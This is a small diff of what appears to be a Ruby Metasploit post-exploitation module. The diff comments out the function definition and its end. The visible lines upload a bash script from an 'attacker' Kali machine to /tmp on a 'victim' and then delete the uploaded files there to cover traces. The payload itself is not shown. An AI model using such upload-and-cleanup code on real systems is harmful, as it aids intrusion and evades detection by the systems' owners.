@@ -1,4 +1,4 @@
-def run_script(client)
+#def run_script(client)
 # Define paths for the bash script and backup file
 local_script = "/home/kali/Documents/backup.sh"           # Path to bash script on attacker
 remote_script = "/tmp/backup.sh"                          # Path to upload script on victim
@@ -32,4 +32,4 @@ end
 print_status("Cleaning up temporary files on the victim machine...")
 cmd_exec("rm -f #{remote_script} #{output}")
 print_good("Temporary files cleaned up.")
-end
+#end
